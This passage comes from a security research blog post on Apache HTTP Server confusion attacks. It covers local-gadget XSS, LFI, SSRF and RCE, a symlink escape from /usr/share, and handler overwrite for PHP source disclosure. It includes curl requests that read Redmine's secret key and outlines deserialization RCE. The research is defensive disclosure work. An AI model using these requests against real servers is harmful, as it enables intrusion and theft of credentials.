        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;latest/index.html&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Thus, even if the target hasn‚Äôt deployed any web application, we can still create XSS using an unsafe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; through files that come within the operating system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-2-2-3-local-gadget-to-lfi&quot;&gt;‚úîÔ∏è 2-2-3. Local Gadget to LFI&lt;/h5&gt;

&lt;p&gt;What about arbitrary file reading? If the target server has PHP or frontend packages installed, like JpGraph, jQuery-jFeed, or even WordPress or Moodle plugins, their tutorials or debug consoles can become our gadgets, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php&lt;/li&gt;
  &lt;li&gt;/usr/share/javascript/jquery-jfeed/proxy.php&lt;/li&gt;
  &lt;li&gt;/usr/share/moodle/mod/assignment/type/wims/getcsv.php&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Here‚Äôs a simple example exploiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxy.php&lt;/code&gt; from jQuery-jFeed to read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-2-2-4-local-gadget-to-ssrf&quot;&gt;‚úîÔ∏è 2-2-4. Local Gadget to SSRF&lt;/h5&gt;

&lt;p&gt;Finding an SSRF vulnerability is also a piece of cake, for instance, MagpieRSS offers a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magpie_debug.php&lt;/code&gt; file, which is fabulous gadget for exploiting:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/php/magpierss/scripts/magpie_debug.php&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;Ô∏è-2-2-5-local-gadget-to-rce&quot;&gt;‚úîÔ∏è 2-2-5. Local Gadget to RCE&lt;/h5&gt;

&lt;p&gt;So, can we achieve RCE? Hold on, let‚Äôs take it step by step! First, This primitive can reapply all known existing attacks again, like an old version of PHPUnit left behind by development or third-party dependencies, can be directly exploited using &lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841&quot;&gt;CVE-2017-9841&lt;/a&gt; to execute arbitrary code. Or phpLiteAdmin installed with a read-only copy, which by default has the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;. By now, you should see the vast potential of Local Gadgets Manipulation. What remains is to discover even more powerful and universal gadgets!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-primitive-2-3-jailbreak-from-local-gadgets&quot;&gt;‚öîÔ∏è Primitive 2-3. Jailbreak from Local Gadgets&lt;/h4&gt;

&lt;p&gt;You might ask: ‚ÄúCan‚Äôt we really break out of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;?‚Äù Of course, we can, that brings out our third primitive ‚Äî &lt;strong&gt;Jailbreak from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;In &lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L160&quot;&gt;Debian/Ubuntu&lt;/a&gt; distributions of Httpd, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FollowSymLinks&lt;/code&gt; option is explicitly enabled by default. Even in non-Debian/Ubuntu versions, Apache HTTP Server also &lt;a href=&quot;https://httpd.apache.org/docs/current/mod/core.html#options&quot;&gt;implicitly allows Symbolic Links&lt;/a&gt; by default.&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Options&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;FollowSymLinks&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;Ô∏è-2-3-1-jailbreak-from-local-gadgets&quot;&gt;‚úîÔ∏è 2-3-1. Jailbreak from Local Gadgets&lt;/h5&gt;

&lt;p&gt;So, any package that has a Symbolic Link in its installation directory pointing outside of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; can become a stepping-stone to access more gadgets for further exploitation. Here are some useful Symbolic Links we‚Äôve discovered so far:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Cacti Log&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/cacti/site/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/cacti/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Solr Data&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/solr/data/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/solr/data&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Solr Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/solr/conf/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/solr/conf/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;MediaWiki Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/mediawiki/config/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/mediawiki/config/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SimpleSAMLphp Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/simplesamlphp/config/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/simplesamlphp/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;Ô∏è-2-3-2-jailbreak-local-gadgets-to-redmine-rce&quot;&gt;‚úîÔ∏è 2-3-2. Jailbreak Local Gadgets to Redmine RCE&lt;/h5&gt;

&lt;p&gt;To wrap up our jailbreak primitive, let‚Äôs showcase how to perform an RCE using a double-hop Symbolic Link in Redmine. In the default installation of Redmine, there‚Äôs an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;instances/&lt;/code&gt; folder pointing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/redmine/&lt;/code&gt;, and within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/redmine/&lt;/code&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;default/config/&lt;/code&gt; folder points to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/redmine/default/&lt;/code&gt; directory, which holds Redmine‚Äôs database setting and secret key.&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file /usr/share/redmine/instances/
 symbolic &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;to /var/lib/redmine/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file /var/lib/redmine/config/
 symbolic &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;to /etc/redmine/default/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /etc/redmine/default/
 database.yml    secret_key.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Thus, through an insecure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; and two Symbolic Links, we can easily access the application secret key used by Redmine:&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f
 HTTP/1.1 200 OK
 Server: Apache/2.4.59 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
 ...
 6d222c3c3a1881c865428edb79a74405
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And since Redmine is a Ruby on Rails application, the content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret_key.txt&lt;/code&gt; is actually the key used for signing and encrypting. The next step should be familiar to those who have attacked RoR before: by embedding malicious Marshal objects, signed and encrypted with the known keys, into cookies, and then achieving remote code execution through Server-Side Deserialization!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-3-handler-confusion&quot;&gt;üî• 3. Handler Confusion&lt;/h3&gt;

&lt;p&gt;The final attack I‚Äôm going to introduce is the confusion based on Handler. This attack also leverages a piece of technical debt that has been left over from the legacy architecture of Apache HTTP Server. Let‚Äôs quickly understand this technical debt through an example ‚Äî if today you want to run the classic &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; on Apache HTTP Server, which of the following two directives do you use?&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; application/x-httpd-php .php
&lt;span class=&quot;nc&quot;&gt;AddType&lt;/span&gt;    application/x-httpd-php .php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The answer is ‚Äî both can correctly get PHP running! Here are the two directive syntaxes, and you can see that not only are the usages similar, but even the effects are exactly the same. Why did Apache HTTP Server initially design two different directives doing the same thing?&lt;/p&gt;

&lt;div class=&quot;language-config highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AddHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; [&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;] ...
&lt;span class=&quot;n&quot;&gt;AddType&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;media&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; [&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;] ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Actually, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handler-name&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;media-type&lt;/code&gt; represent different fields within Httpd‚Äôs internal structure, corresponding to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt;, respectively. The fact that &lt;strong&gt;users can use them interchangeably without realizing it is thanks to a piece of code that has been in Apache HTTP Server since &lt;a href=&quot;https://svn.apache.org/repos/asf/httpd/httpd/branches/1.3.x/src/main/http_config.c&quot;&gt;its early development in 1996&lt;/a&gt;&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/server/config.c#L420&quot;&gt;server/config.c#L420&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AP_CORE_DECLARE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_invoke_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ap_strchr_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apr_pmemdup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

                &lt;span class=&quot;cm&quot;&gt;/* exclude media type arguments */&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                    &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* strip trailing spaces */&lt;/span&gt;

                &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AP_DEFAULT_HANDLER_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_run_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that before entering the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_run_handler()&lt;/code&gt;, if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; is empty, the content of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; is used as the final module handler. This is also why &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddHandler&lt;/code&gt; have the identical effect, because the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;media-type&lt;/code&gt; is eventually converted into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handler-name&lt;/code&gt; before handling. So, our third Handler Confusion is mainly developed around this behavior.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-primitive-3-1-overwrite-the-handler&quot;&gt;‚öîÔ∏è Primitive 3-1. Overwrite the Handler&lt;/h4&gt;

&lt;p&gt;By understanding this conversion mechanism, the first primitive is ‚Äî &lt;strong&gt;Overwrite the Handler&lt;/strong&gt;. Imagine if today the target Apache HTTP Server uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; to run PHP.&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddType&lt;/span&gt; application/x-httpd-php  .php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the normal process, when accessing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://server/config.php&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_mime&lt;/code&gt;, during the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type_checker&lt;/code&gt; phase, Httpd copies the corresponding content into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; based on the file extension set by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt;. Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; is not assigned during the entire HTTP lifecycle, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; will treat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; as the handler, ultimately calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; to handle the request.&lt;/p&gt;

&lt;p&gt;However, what happens if any module ‚Äúaccidentally‚Äù overwrites &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; before reaching &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt;?&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-3-1-1-overwrite-handler-to-disclose-php-source-code&quot;&gt;‚úîÔ∏è 3-1-1. Overwrite Handler to Disclose PHP Source Code&lt;/h5&gt;

&lt;p&gt;The first exploitation of this primitive is to disclose arbitrary PHP source code by the ‚Äúaccidentally-overwrite‚Äù. This technique was first mentioned by Max Dmitriev in his research presented at ZeroNights 2021 (kudos to him!), and you can check his slides here:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf&quot;&gt;Apache 0day bug, which still nobody knows of, and which was fixed accidentally&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Max Dmitriev observed that by sending an incorrect &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Length&lt;/code&gt;, the remote Httpd server would trigger an unexpected error and inadvertently return the source code of PHP script. Upon investigating the process, he discovered that the issue was due to ModSecurity not properly handling the return value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AP_FILTER_ERROR&lt;/code&gt; while using the Apache Portable Runtime (APR) library, leading to a &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;double response&lt;/a&gt;. When an error occurred, Httpd attempts to send out HTML error messages, thus accidentally overwriting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;text/html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because ModSecurity did not properly handle the return values, the internal HTTP lifecycle that should have stopped continued. This ‚Äúside effect‚Äù also overwrote the originally added &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;, resulting in files that should have been processed as PHP being treated as plain documents, exposing its source code and sensitive settings. ü§´&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://127.0.0.1/info.php &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Length: x&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; HTTP/1.1 400 Bad Request
